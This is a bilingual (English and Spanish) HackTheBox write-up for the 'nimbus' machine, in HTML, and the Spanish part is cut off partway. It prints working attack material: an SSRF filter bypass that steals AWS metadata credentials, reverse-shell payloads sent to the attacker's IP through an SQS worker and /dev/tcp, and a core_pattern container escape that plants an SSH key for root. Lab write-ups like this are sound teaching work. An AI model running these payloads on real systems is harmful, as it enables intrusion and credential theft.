@@ -1,0 +1,1133 @@
+<!DOCTYPE html>
+<html lang="es" data-theme="light">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>nimbus | Writeup</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@400;600;800&display=swap"
+        rel="stylesheet">
+    <link rel="stylesheet" href="../../index.css">
+</head>
+
+<body>
+    <nav class="top-nav">
+        <div class="container">
+            <div class="nav-content">
+                <div class="nav-left">
+                    <a href="../../index.html" class="back-link" title="Back to home">←</a>
+                    <h1 data-i18n="site-title">KDW_LABS</h1>
+                </div>
+                <div class="nav-controls">
+                    <button id="theme-toggle" class="icon-btn" aria-label="Toggle theme">
+                        <span class="theme-icon">🌙</span>
+                    </button>
+                    <button id="lang-toggle" class="icon-btn" aria-label="Toggle language">
+                        <span>EN</span>
+                    </button>
+                </div>
+            </div>
+        </div>
+    </nav>
+
+    <main class="container">
+        <header class="machine-header">
+            <h1 class="machine-title">nimbus</h1>
+            <div class="machine-meta">
+                <span class="badge badge-platform">HTB</span>
+                <span class="badge badge-difficulty-hard">hard</span>
+            </div>
+        </header>
+
+        <article class="machine-content">
+            <!-- ENGLISH -->
+            <div id="content-en" class="lang-content" style="display:none;">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Exploitation Summary</h2>
+                    <p><strong>Exploitation process:</strong> The target exposed a web application allowing users to
+                        submit jobs by URL. The hint about internal addresses and IMDS-style cloud metadata endpoints
+                        being blocked immediately pointed to an SSRF vulnerability. By converting the IMDS IP
+                        <code>169.254.169.254</code> to its decimal form (<code>2852039166</code>) and appending a
+                        <code>?.yaml</code> query parameter, I bypassed the filter and reached the AWS metadata service.</p>
+                    <p>From the IMDS I extracted temporary credentials for the <code>nimbus-web-role</code>. Using these
+                        credentials with a LocalStack-like AWS endpoint, enumeration revealed an SQS queue
+                        <code>nimbus-jobs</code>. Further SSRF-based internal port scanning exposed an S3 endpoint
+                        holding the worker source code (<code>worker.py</code>), which executed any
+                        <code>script</code> field of a submitted job directly with <code>python3</code>.</p>
+                    <p>Sending a crafted message to the SQS queue gave me a reverse shell as the <code>worker</code>
+                        user inside a container. From there, internal network mapping revealed a LocalStack instance at
+                        <code>172.18.0.2:4566</code> accessible as the AWS root account using the default
+                        <code>test:test</code> credentials.</p>
+                    <p>Finally, I abused AWS CodeBuild on LocalStack: creating a privileged build
+                        (<code>privilegedMode: True</code> grants <code>CAP_SYS_ADMIN</code>), overriding the
+                        <code>mkdir</code> command via <code>BASH_FUNC</code> environment injection, and abusing
+                        <code>core_pattern</code> to execute a root payload on the host. This wrote my SSH public key
+                        into <code>/root/.ssh/authorized_keys</code>, granting root via SSH.</p>
+                    <p><strong>Technologies/Exploits:</strong> SSRF decimal IP bypass against AWS IMDS, SSRF internal
+                        enumeration, AWS SQS worker RCE via YAML/Python job execution, LocalStack CodeBuild
+                        <code>core_pattern</code> abuse for container escape and privilege escalation.</p>
+                </div>
+                <hr class="summary-divider">
+
+                <h2>Initial Reconnaissance</h2>
+                <p>Starting with an nmap scan to identify the open ports and services on the target:</p>
+                <pre><code class="language-plaintext">PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   256 eb:ab:8f:be:99:02:0b:3e:c4:1c:83:b2:66:2f:17:13 (ECDSA)
+|_  256 c1:69:ab:84:f3:88:8b:b3:8a:ae:e2:28:35:54:35:0b (ED25519)
+80/tcp open  http    nginx 1.24.0 (Ubuntu)
+|_http-server-header: nginx/1.24.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://nimbus.htb/
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre>
+
+                <p>I add <code>nimbus.htb</code> to my <code>/etc/hosts</code> file. On port 80 I find a fairly
+                    interesting web application:</p>
+                <p><img src="./media/image3.png"
+                        alt="Nimbus web application landing page showing the cloud jobs platform" /></p>
+
+                <p>The "submit jobs" feature is interesting, specifically the part where you can submit a URL. We also
+                    learn that they use Slack and that Marcus is a DevOps lead.</p>
+
+                <p>The job submitter has no authentication temporarily:</p>
+                <p><img src="./media/image8.png" alt="Job submitter form without authentication" /></p>
+                <p><img src="./media/image5.png"
+                        alt="Job submission interface with the note about blocked internal addresses and IMDS endpoints" /></p>
+
+                <p>The comment stating that internal addresses and IMDS-style cloud metadata endpoints (<a
+                        href="https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-data-retrieval.html">AWS
+                        EC2 instance metadata retrieval docs</a>) are blocked is a clear indicator of SSRF.</p>
+
+                <h2>Virtual Host Enumeration</h2>
+                <p>Fuzzing virtual hosts I find:</p>
+                <pre><code class="language-plaintext">aws.nimbus.htb   Status: 403 [Size: 305]</code></pre>
+
+                <p>I add it to <code>/etc/hosts</code>. Everything points to this virtual host being an AWS simulator,
+                    likely something like LocalStack.</p>
+
+                <h2>SSRF - Bypassing the IMDS Filter</h2>
+                <p>Indeed, if I try to point to the IMDS URL the filter blocks me:</p>
+                <p><img src="./media/image1.png"
+                        alt="Blocked response when trying to reach the IMDS metadata URL directly" /></p>
+
+                <p>I also append the <code>?.yaml</code> query parameter to the URLs to pass another filter check:</p>
+                <p><img src="./media/image6.png" alt="URL with the ?.yaml query parameter appended to bypass filtering" /></p>
+
+                <p>The simple trick of converting an IPv4 address to decimal (<a
+                        href="https://www.ipaddressguide.com/ip">ipaddressguide.com/ip</a>) works to bypass the block
+                    they apply:</p>
+                <pre><code class="language-plaintext">169.254.169.254  ->  2852039166</code></pre>
+
+                <p>From this URL:</p>
+                <pre><code class="language-plaintext">http://2852039166/latest/meta-data/?.yaml</code></pre>
+
+                <p>I can see the IMDS service structure, which is like navigating folders:</p>
+                <p><img src="./media/image2.png" alt="IMDS metadata directory structure browsed through SSRF" /></p>
+
+                <h2>Extracting Role Credentials from IMDS</h2>
+                <p>Inside this path you can find credentials for an AWS role:</p>
+                <pre><code class="language-plaintext">http://2852039166/latest/meta-data/iam/security-credentials/nimbus-web-role?.yaml</code></pre>
+                <p><img src="./media/image7.png" alt="JSON response containing temporary AWS role credentials" /></p>
+
+                <pre><code class="language-json">{
+  "Code": "Success",
+  "LastUpdated": "...",
+  "Type": "AWS-HMAC",
+  "AccessKeyId": "ASIAQX4PG7L2K9M3N5R8",
+  "SecretAccessKey": "bXJ7K8mP/q2Hf+vN9wT4LcRe5Y1Aoz3DhU6gKjQs",
+  "Token": "IQoJb3JpZ2luX2VjEHQaCXVzLWVhc3QtMSJ...",
+  "Expiration": "..."
+}</code></pre>
+
+                <p>As you can see, the token begins with <code>ASIA</code> and the credential name indicates it is a
+                    role; therefore this token is required to authenticate, unlike regular IAM user credentials which
+                    begin with <code>AKIA</code> and don't need this token.</p>
+
+                <p>I also find this information under:</p>
+                <pre><code class="language-plaintext">http://2852039166/latest/meta-data/iam/info?.yaml
+
+InstanceProfileArn  arn:aws:iam::847219365028:instance-profile/nimbus-web-profile
+InstanceProfileId   AIPAQX4PG7L2K9M3N5R8K</code></pre>
+
+                <p>This is the profile applied to the EC2 instance and its ID; you can also see the account ID.</p>
+
+                <p>At <code>http://2852039166/latest/meta-data/hostname?.yaml</code> I find the EC2 internal IP:</p>
+                <pre><code class="language-plaintext">ip-10-0-1-42.ec2.internal</code></pre>
+
+                <p>At <code>http://2852039166/latest/meta-data/placement/region?.yaml</code> I see they use the region
+                    <code>us-east-1</code>. But really, the important thing here is the role credentials and possibly
+                    the profile ones.</p>
+
+                <h2>Configuring AWS Access</h2>
+                <p>I create a profile under <code>~/.aws/credentials</code>:</p>
+                <pre><code class="language-ini">[nimbus]
+endpoint_url = http://aws.nimbus.htb
+region = us-east-1
+aws_access_key_id = ASIAQX4PG7L2K9M3N5R8
+aws_secret_access_key = bXJ7K8mP/q2Hf+vN9wT4LcRe5Y1Aoz3DhU6gKjQs
+aws_session_token = IQoJb3JpZ(...)</code></pre>
+
+                <p>And export it to use it by default:</p>
+                <pre><code class="language-bash">export AWS_PROFILE=nimbus</code></pre>
+
+                <p>I confirm access:</p>
+                <pre><code class="language-bash">aws sts get-caller-identity --profile nimbus</code></pre>
+                <pre><code class="language-json">{
+  "UserId": "AROAQX4PG7L2K9M3N5R8H:i-0a1b2c3d4e5f6789a",
+  "Account": "847219365028",
+  "Arn": "arn:aws:sts::847219365028:assumed-role/nimbus-web-role/i-0a1b2c3d4e5f6789a"
+}</code></pre>
+
+                <p>It seems the permissions are at least somewhat restricted:</p>
+                <pre><code class="language-bash">aws s3 ls --profile nimbus
+An error occurred (AccessDenied) when calling the ListBuckets operation: User: arn:aws:sts::847219365028:assumed-role/nimbus-web-role/i-0a1b2c3d4e5f6789a is not authorized to perform: s3:ListAllMyBuckets on resource: *</code></pre>
+
+                <h2>Enumerating Accessible AWS Services</h2>
+                <p>I try a few more things but it doesn't look like the typical services are accessible, so I'll use
+                    this tool that automates a sweep of API calls and warns if something interesting might be open: <a
+                        href="https://github.com/andresriancho/enumerate-iam">enumerate-iam</a>.</p>
+
+                <p>When I launch it I see this:</p>
+                <pre><code class="language-plaintext">[INFO] -- sqs.list_queues() worked!</code></pre>
+
+                <p>This matches the jobs mechanic described on the website. But I think the information isn't entirely
+                    complete, so I'll use a more thorough tool: <a
+                        href="https://github.com/BishopFox/cloudfox">CloudFox</a>.</p>
+
+                <p>I run it with the command:</p>
+                <pre><code class="language-bash">AWS_ENDPOINT_URL=http://aws.nimbus.htb cloudfox aws --profile nimbus all-checks</code></pre>
+
+                <p>And it produces an AWS inventory of the resources it can access:</p>
+                <pre><code class="language-json">[
+  { "Resource Type": "Total",      "us-east-1": "1" },
+  { "Resource Type": "SQS Queues", "us-east-1": "1" }
+]</code></pre>
+
+                <p>And some commands I can try:</p>
+                <pre><code class="language-bash"># ------------------
+# Queue: nimbus-jobs
+# ------------------
+# Receive a message from the queue
+aws --profile $profile --region us-east-1 sqs receive-message --queue-url http://floci:4566/847219365028/nimbus-jobs --attribute-names All --message-attribute-names All --max-number-of-messages 5 --visibility-timeout 0
+
+# Send a message to the queue without attributes file
+aws --profile $profile --region us-east-1 sqs send-message --queue-url http://floci:4566/847219365028/nimbus-jobs --message-body "[INSERT MESSAGE BODY]"
+
+# Send message to the queue with attributes file (You'll have to create and populate the file)
+aws --profile $profile --region us-east-1 sqs send-message --queue-url http://floci:4566/847219365028/nimbus-jobs --message-body "[INSERT MESSAGE BODY] --message-attributes file://./file.json"</code></pre>
+
+                <pre><code class="language-bash">aws sqs list-queues
+{
+  "QueueUrls": [
+    "http://floci:4566/847219365028/nimbus-jobs"
+  ]
+}</code></pre>
+
+                <p>I can reuse the SSRF to reach this endpoint, but at first the filter stops me. After some testing I
+                    see it blocks the string <code>floci</code>, since the same URL with my machine's IP isn't blocked.</p>
+
+                <p>But I can also keep interacting with AWS through this URL. I try the commands CloudFox suggested:</p>
+                <pre><code class="language-bash">aws sqs get-queue-attributes
+aws sqs send-message</code></pre>
+
+                <p>Being able to send messages seems interesting; maybe I can influence actions in some way.</p>
+
+                <p>On the website, if I submit a YAML through the web (not by URL), it returns this message:</p>
+                <p><img src="./media/image4.png" alt="Web response after submitting a YAML job through the interface" /></p>
+
+                <p>But it doesn't seem to give me any information I don't already know.</p>
+
+                <h2>SSRF - Internal Port Scanning</h2>
+                <p>With the same trick of using a decimal IPv4 I can access <code>127.0.0.1</code> (localhost). I write
+                    a quick script to sweep the internal ports:</p>
+                <pre><code class="language-bash">scan_port() {
+  i=$1
+  response=$(curl -s -m 2 -X POST --data-binary "url=http://2130706433:${i}?.yaml" http://nimbus.htb/jobs/preview)
+  if ! echo "$response" | grep -q "Could not fetch"; then
+    echo "[+] Port $i: $response" | tee -a results.txt
+  fi
+}
+export -f scan_port
+seq 1 65535 | xargs -P 50 -I{} bash -c 'scan_port "$@"' _ {}</code></pre>
+
+                <p>Several ports respond:</p>
+                <pre><code class="language-plaintext">80     -> web
+5000   -> web (probably for the reverse proxy)
+9090   -> localstack/floci
+14566  -> Interesting response, returns XML
+16733, 16743, 16741, 16739, 52645, 52646 -> probably ephemeral or internal service ports, empty response
+33265  -> the web again</code></pre>
+
+                <p>The XML from port 14566 returns a bucket name, <code>nimbus-dev-artifacts</code>:</p>
+                <pre><code class="language-xml">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;ListAllMyBucketsResult xmlns="http://s3.amazonaws.com/doc/2006-03-01/"&gt;
+  &lt;Owner&gt;&lt;ID&gt;owner&lt;/ID&gt;&lt;DisplayName&gt;owner&lt;/DisplayName&gt;&lt;/Owner&gt;
+  &lt;Buckets&gt;
+    &lt;Bucket&gt;
+      &lt;Name&gt;nimbus-dev-artifacts&lt;/Name&gt;
+      &lt;CreationDate&gt;2026-06-23T21:28:48.292192121Z&lt;/CreationDate&gt;
+    &lt;/Bucket&gt;
+  &lt;/Buckets&gt;
+&lt;/ListAllMyBucketsResult&gt;</code></pre>
+
+                <p>I can't list the bucket with the credentials I have, but I can keep calling this port with the bucket
+                    name:</p>
+                <pre><code class="language-plaintext">http://2130706433:14566/nimbus-dev-artifacts?.yaml</code></pre>
+                <pre><code class="language-xml">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;ListBucketResult xmlns="http://s3.amazonaws.com/doc/2006-03-01/"&gt;
+  &lt;Name&gt;nimbus-dev-artifacts&lt;/Name&gt;
+  &lt;Prefix&gt;&lt;/Prefix&gt;&lt;MaxKeys&gt;1000&lt;/MaxKeys&gt;&lt;IsTruncated&gt;false&lt;/IsTruncated&gt;
+  &lt;Contents&gt;
+    &lt;Key&gt;source/worker.py&lt;/Key&gt;
+    &lt;LastModified&gt;2026-06-23T21:28:49Z&lt;/LastModified&gt;
+    &lt;ETag&gt;&amp;quot;47109e759cbf87fd1c47d3a5097582ee&amp;quot;&lt;/ETag&gt;
+    &lt;Size&gt;1755&lt;/Size&gt;&lt;StorageClass&gt;STANDARD&lt;/StorageClass&gt;
+  &lt;/Contents&gt;
+&lt;/ListBucketResult&gt;</code></pre>
+
+                <p>And on the path shown in this last XML I retrieve the worker's contents:</p>
+                <pre><code class="language-plaintext">http://2130706433:14566/nimbus-dev-artifacts/source/worker.py?.yaml</code></pre>
+
+                <h2>Analyzing the Worker</h2>
+                <pre><code class="language-python">"""Nimbus job worker"""
+import os, time, subprocess, boto3, yaml
+
+ENDPOINT  = os.environ.get("AWS_ENDPOINT_URL", "http://aws.nimbus.htb")
+QUEUE_URL = os.environ.get("QUEUE_URL", "http://aws.nimbus.htb/847219365028/nimbus-jobs")
+REGION    = os.environ.get("AWS_DEFAULT_REGION", "us-east-1")
+POLL_SECS = 5
+
+print(f"[worker] starting; endpoint={ENDPOINT} queue={QUEUE_URL}", flush=True)
+sqs = boto3.client("sqs", endpoint_url=ENDPOINT, region_name=REGION)
+
+def handle_message(body):
+    print(f"[worker] received message ({len(body)} bytes)", flush=True)
+    job = yaml.load(body, Loader=yaml.Loader)
+    if not isinstance(job, dict):
+        print("[worker] message did not parse to a dict, skipping", flush=True)
+        return
+    name = job.get("name", "&lt;unnamed&gt;")
+    script = job.get("script", "")
+    print(f"[worker] running job '{name}'", flush=True)
+    if script:
+        result = subprocess.run(["python3", "-c", script],
+                                capture_output=True, text=True, timeout=30)
+        print(f"[worker] stdout: {result.stdout}", flush=True)
+        if result.stderr: print(f"[worker] stderr: {result.stderr}", flush=True)
+
+def main():
+    while True:
+        try:
+            resp = sqs.receive_message(QueueUrl=QUEUE_URL,
+                                       MaxNumberOfMessages=1, WaitTimeSeconds=POLL_SECS)
+            for m in resp.get("Messages", []):
+                try: handle_message(m["Body"])
+                except Exception as e: print(f"[worker] error: {e}", flush=True)
+                finally:
+                    sqs.delete_message(QueueUrl=QUEUE_URL, ReceiptHandle=m["ReceiptHandle"])
+        except Exception as e:
+            print(f"[worker] poll error: {e}", flush=True)
+        time.sleep(POLL_SECS)
+
+if __name__ == "__main__":
+    main()</code></pre>
+
+                <p>Here it's especially interesting that the worker can receive a <code>script</code> field and execute
+                    it directly with python.</p>
+
+                <h2>Initial Access - RCE via SQS Worker</h2>
+                <p>To achieve RCE I set up a netcat listener on port 443 and send this message to the SQS queue:</p>
+                <pre><code class="language-bash">aws sqs send-message \
+  --queue-url "http://aws.nimbus.htb/847219365028/nimbus-jobs" \
+  --message-body $'name: pwn\nscript: "import os,pty,socket;s=socket.socket();s.connect((\'10.10.14.147\',443));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn(\'/bin/bash\')"'
+
+{
+  "MD5OfMessageBody": "8c755b55dbacf1aedd80d64d44ef46e8",
+  "MessageId": "6bb4efc4-f23c-45c4-a3a5-f7a383daa974"
+}</code></pre>
+
+                <p>I receive a reverse shell as the <code>worker</code> user inside a container.</p>
+
+                <p>It's also a problem that the script has a 30-second timeout, which means this reverse shell only
+                    survives those 30 seconds. To mitigate this I listen on port 4445, for example, and send myself a
+                    reverse shell as an independent process using the <code>setsid</code> command:</p>
+                <pre><code class="language-bash">setsid bash -i &gt;&amp; /dev/tcp/10.10.14.147/4445 0&gt;&amp;1 &amp;</code></pre>
+
+                <p>It's also possible to do this with the <code>nohup</code> command as I've seen on other machines, but
+                    the shell hung with that one. With this independent shell I get access without issues.</p>
+
+                <h2>Container Enumeration</h2>
+                <p>With the <code>env</code> command I see an access key and its secret that I didn't know about:</p>
+                <pre><code class="language-plaintext">AWS_SECRET_ACCESS_KEY=dM4nV/q8Hf7LcRpZ2eY1KjBxN5Aozs3T6gU9JfWh
+AWS_ACCESS_KEY_ID=AKIA7P3R9X4K8M2L5VHN</code></pre>
+
+                <p>I repeat the process of using CloudFox to see if anything else is accessible with these new
+                    credentials, but I get no more results or privileges than what I already obtained with the role.</p>
+
+                <p>I investigate the machine manually and with linpeas to see if a container escape is possible via some
+                    of the recent Linux kernel vulnerabilities (copy_file_range, DirtyPipe, etc.) but it doesn't seem
+                    possible; the image appears to be hardened.</p>
+
+                <h2>Internal Network Mapping</h2>
+                <p>I transfer an nmap binary into the container to map the network better and find this:</p>
+                <pre><code class="language-plaintext">worker@c513b14aaeef:~$ ./nmap -p- --min-rate 10000 172.17.0.1
+Nmap scan report for 172.17.0.1
+Host is up (0.0012s latency).
+PORT   STATE SERVICE
+22/tcp open  ssh
+
+worker@c513b14aaeef:~$ ./nmap -p- --min-rate 10000 172.18.0.1-3
+Nmap scan report for nimbus.htb (172.18.0.1)
+Host is up (0.0074s latency).
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+Nmap scan report for nimbus-floci.nimbus-net (172.18.0.2)
+Host is up (0.00084s latency).
+PORT     STATE SERVICE
+4566/tcp open  unknown
+9169/tcp open  unknown
+
+Nmap scan report for c513b14aaeef (172.18.0.3)
+Host is up (0.0022s latency).
+All 65535 scanned ports on c513b14aaeef (172.18.0.3) are closed</code></pre>
+
+                <pre><code class="language-bash">worker@c513b14aaeef:~$ aws sts get-caller-identity --endpoint-url=http://172.18.0.2:4566
+{
+  "UserId": "847219365028",
+  "Account": "847219365028",
+  "Arn": "arn:aws:iam::847219365028:root"
+}</code></pre>
+
+                <p>It's interesting that I'm root through port 4566 of IP <code>172.18.0.2</code>, which is the same as
+                    <code>floci:4566</code> — the endpoint that returned the bucket data with the worker code, and also
+                    the same as the SQS queue URL. Furthermore, port 4566 is the default port for LocalStack.</p>
+
+                <h2>Privilege Escalation - LocalStack CodeBuild Abuse</h2>
+                <p>With this information, a good way to escalate privileges may be with AWS CodeBuild, using the default
+                    credentials that LocalStack uses, <code>test:test</code>. I check that I can access this service:</p>
+                <pre><code class="language-python">&gt;&gt;&gt; import boto3, json
+&gt;&gt;&gt; cb = boto3.client('codebuild', endpoint_url='http://172.18.0.2:4566',
+...     aws_access_key_id='test', aws_secret_access_key='test', region_name='us-east-1')
+&gt;&gt;&gt; projects = cb.list_projects()
+&gt;&gt;&gt; print(projects)
+{'projects': [], ...}</code></pre>
+
+                <p>There are no projects created, but it doesn't matter, since the goal here is to create one myself
+                    with specific parameters to achieve RCE on the host.</p>
+
+                <p>To do this I work with AI to get a first build that works, using the default image
+                    <code>floci/floci:latest</code>:</p>
+                <pre><code class="language-python">import boto3, time
+
+ENDPOINT = 'http://172.18.0.2:4566'
+cb = boto3.client('codebuild',
+    endpoint_url=ENDPOINT,
+    aws_access_key_id='test',
+    aws_secret_access_key='test',
+    region_name='us-east-1'
+)
+
+try:
+    cb.create_project(
+        name='nimbus-poc',
+        source={'type': 'NO_SOURCE'},
+        artifacts={'type': 'NO_ARTIFACTS'},
+        environment={
+            'type': 'LINUX_CONTAINER',
+            'computeType': 'BUILD_GENERAL1_SMALL',
+            'image': 'floci/floci:latest',
+            'privilegedMode': True,
+        },
+        serviceRole='arn:aws:iam::000000000000:role/codebuild-role',
+    )
+    print("Project created")
+except Exception as e:
+    print("Error:", e)
+
+buildspec = """version: 0.2
+phases:
+  build:
+    commands:
+      - id
+      - ls /proc/1/root/root/
+      - cat /proc/1/root/root/root.txt
+"""
+
+resp = cb.start_build(projectName='nimbus-poc', buildspecOverride=buildspec)
+build_id = resp['build']['id']
+print("Build ID:", build_id)
+
+for _ in range(40):
+    time.sleep(3)
+    status = cb.batch_get_builds(ids=[build_id])['builds'][0]
+    print(f"  {status['buildStatus']} / {status['currentPhase']}")
+    if status['buildStatus'] != 'IN_PROGRESS':
+        break
+
+logs = boto3.client('logs',
+    endpoint_url=ENDPOINT,
+    aws_access_key_id='test',
+    aws_secret_access_key='test',
+    region_name='us-east-1'
+)
+events = logs.get_log_events(
+    logGroupName=status['logs']['groupName'],
+    logStreamName=status['logs']['streamName'],
+)
+for e in events['events']:
+    print(e['message'])</code></pre>
+
+                <p>This line is especially important:</p>
+                <pre><code class="language-python">'privilegedMode': True,</code></pre>
+
+                <p>It assigns the <code>CAP_SYS_ADMIN</code> capability to the container and will let me abuse
+                    <code>core_pattern</code> later to escape from the container I create through the builds.</p>
+
+                <p>But it fails with this error:</p>
+                <pre><code class="language-plaintext">Build ID: nimbus-poc:1
+FAILED / COMPLETED
+mkdir: cannot create directory '/codebuild': Permission denied</code></pre>
+
+                <p>The container runner tries to create the <code>codebuild</code> directory but doesn't have
+                    permission to create it in the container's filesystem root.</p>
+
+                <h2>Achieving Root via core_pattern Abuse</h2>
+                <p>To reach the host later I need elevated root privileges, so to solve this I'll override environment
+                    variables via <code>BASH_FUNC_mkdir%%</code> in the next build. This will make it so that when the
+                    container is built and uses the <code>mkdir</code> command with elevated privileges, I'll replace
+                    the <code>mkdir</code> command with the command(s) I define, thus achieving RCE as root in the
+                    container:</p>
+
+                <pre><code class="language-python">import boto3
+
+ENDPOINT = 'http://172.18.0.2:4566'
+PROJECT = 'nimbus-deploy'
+
+cb = boto3.client('codebuild',
+    region_name='us-east-1',
+    endpoint_url=ENDPOINT,
+    aws_access_key_id='test',
+    aws_secret_access_key='test',
+)
+
+buildspec = r"""version: 0.2
+phases:
+  build:
+    commands:
+      - UDIR=$(sed -n 's/.*upperdir=\([^,]*\).*/\1/p' /proc/self/mountinfo | head -1) || true
+      - printf '#!/bin/sh\necho ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILnsFLLgBuhGAkDdmNK86OBVaDN8Aqyy+l6EpQuz8uBJ asd@asd.com > /root/.ssh/authorized_keys\n' > /exploit_root.sh || true
+      - chmod +x /exploit_root.sh || true
+      - echo "|${UDIR}/exploit_root.sh" > /proc/sys/kernel/core_pattern || true
+      - ulimit -c unlimited || true
+      - bash -c 'kill -11 $$' || true
+"""
+
+try:
+    cb.create_project(
+        name=PROJECT,
+        source={'type': 'NO_SOURCE'},
+        artifacts={'type': 'NO_ARTIFACTS'},
+        environment={
+            'type': 'LINUX_CONTAINER',
+            'computeType': 'BUILD_GENERAL1_SMALL',
+            'image': 'floci/floci:latest',
+            'privilegedMode': True,
+            'environmentVariables': [],
+        },
+        serviceRole='arn:aws:iam::000000000000:role/codebuild-role',
+    )
+    print("Project created")
+except Exception as e:
+    print("Already exists:", e)
+
+resp = cb.start_build(
+    projectName=PROJECT,
+    environmentVariablesOverride=[
+        {'name': 'BASH_FUNC_id%%', 'value': '() { echo uid=1000; }', 'type': 'PLAINTEXT'}
+    ],
+    buildspecOverride=buildspec,
+)
+print("Build:", resp['build']['id'])</code></pre>
+
+                <p>In this final build, what I do is create the <code>nimbus-deploy</code> project if it doesn't exist,
+                    and then create a build that runs the following commands:</p>
+                <ol>
+                    <li>With the <code>mountinfo</code> command I get the path on the host where the container's changes
+                        are written — the path in the system where the new container I generate lives.</li>
+                    <li>I create a payload that is a shell script inside the container that writes my public key to
+                        <code>/root/.ssh/authorized_keys</code> on the host.</li>
+                    <li>I write the path where the script I created lives into
+                        <code>/proc/sys/kernel/core_pattern</code>. This tells the kernel what to do when a process
+                        crashes (having the <code>CAP_SYS_ADMIN</code> privilege lets me write to this file). So when a
+                        process crashes it will run my script on the host, as root!</li>
+                    <li>I enable core dumps for the current process.</li>
+                    <li>I trigger the crash (SIGSEGV), which sets off the chain I built with my payload.</li>
+                </ol>
+
+                <p>When all of this happens, the end result is that my public key is written to
+                    <code>/root/.ssh/authorized_keys</code> on the host, and now I can log in via SSH as root and get
+                    the system flag:</p>
+                <pre><code class="language-bash">root@nimbus:~# whoami
+root</code></pre>
+            </div>
+
+            <!-- SPANISH -->
+            <div id="content-es" class="lang-content">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Resumen de Explotación</h2>
+                    <p><strong>Resumen del proceso:</strong> El objetivo exponía una aplicación web que permitía enviar
+                        jobs por URL. La pista sobre direcciones internas y endpoints de metadatos cloud tipo IMDS
+                        bloqueados apuntaba directamente a una vulnerabilidad SSRF. Convirtiendo la IP de IMDS
+                        <code>169.254.169.254</code> a su forma decimal (<code>2852039166</code>) y añadiendo el query
+                        parameter <code>?.yaml</code>, bypasseé el filtro y alcancé el servicio de metadatos de AWS.</p>
+                    <p>Desde el IMDS extraje credenciales temporales del rol <code>nimbus-web-role</code>. Usando estas
+                        credenciales contra un endpoint AWS tipo LocalStack, la enumeración reveló una cola SQS
+                        <code>nimbus-jobs</code>. Un barrido de puertos internos vía SSRF expuso un endpoint S3 que
+                        alojaba el código fuente del worker (<code>worker.py</code>), que ejecutaba directamente con
+                        <code>python3</code> cualquier campo <code>script</code> de un job enviado.</p>
+                    <p>Enviando un mensaje diseñado a la cola SQS conseguí una reverse shell como usuario
+                        <code>worker</code> dentro de un contenedor. Desde ahí, el mapeo de la red interna reveló una
+                        instancia de LocalStack en <code>172.18.0.2:4566</code> accesible como cuenta root de AWS usando
+                        las credenciales por defecto <code>test:test</code>.</p>
+                    <p>Finalmente, abusé de AWS CodeBuild sobre LocalStack: creando una build privilegiada
+                        (<code>privilegedMode: True</code> otorga <code>CAP_SYS_ADMIN</code>), sobrescribiendo el comando
+                        <code>mkdir</code> mediante inyección de variables de entorno <code>BASH_FUNC</code>, y abusando
+                        de <code>core_pattern</code> para ejecutar un payload como root en el host. Esto escribió mi
+                        clave pública SSH en <code>/root/.ssh/authorized_keys</code>, otorgando acceso root vía SSH.</p>
+                    <p><strong>Tecnologías/Exploits:</strong> bypass SSRF con IP decimal contra AWS IMDS, enumeración
+                        interna vía SSRF, RCE mediante el worker de AWS SQS por ejecución de jobs YAML/Python, abuso de
+                        <code>core_pattern</code> en LocalStack CodeBuild para escape de contenedor y escalada de
+                        privilegios.</p>
+                </div>
+                <hr class="summary-divider">
+
+                <h2>Reconocimiento Inicial</h2>
+                <p>Comienzo con un escaneo de nmap para identificar los puertos abiertos y servicios en el objetivo:</p>
+                <pre><code class="language-plaintext">PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   256 eb:ab:8f:be:99:02:0b:3e:c4:1c:83:b2:66:2f:17:13 (ECDSA)
+|_  256 c1:69:ab:84:f3:88:8b:b3:8a:ae:e2:28:35:54:35:0b (ED25519)
+80/tcp open  http    nginx 1.24.0 (Ubuntu)
+|_http-server-header: nginx/1.24.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://nimbus.htb/
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre>
+
+                <p>Añado <code>nimbus.htb</code> al <code>/etc/hosts</code>. En el puerto 80 me encuentro una web
+                    bastante interesante:</p>
+                <p><img src="./media/image3.png"
+                        alt="Página principal de la aplicación web de Nimbus mostrando la plataforma de jobs cloud" /></p>
+
+                <p>La parte de enviar jobs es interesante, concretamente la parte de enviar una URL. También sabemos que
+                    usan Slack y que Marcus es un DevOps lead.</p>
+
+                <p>El job submitter no tiene autenticación de manera temporal:</p>
+                <p><img src="./media/image8.png" alt="Formulario de envío de jobs sin autenticación" /></p>
+                <p><img src="./media/image5.png"
+                        alt="Interfaz de envío de jobs con la nota sobre direcciones internas y endpoints IMDS bloqueados" /></p>
+
+                <p>El comentario de que las direcciones internas y los endpoints de metadatos cloud estilo IMDS (<a
+                        href="https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-data-retrieval.html">documentación
+                        de recuperación de metadatos de instancia AWS EC2</a>) están bloqueados es un indicador claro de
+                    SSRF.</p>
+
+                <h2>Enumeración de Virtual Hosts</h2>
+                <p>Fuzzeando virtual hosts encuentro este:</p>
+                <pre><code class="language-plaintext">aws.nimbus.htb   Status: 403 [Size: 305]</code></pre>
+
+                <p>Lo añado al <code>/etc/hosts</code>. Todo apunta a que este virtual host será un simulador de AWS tipo
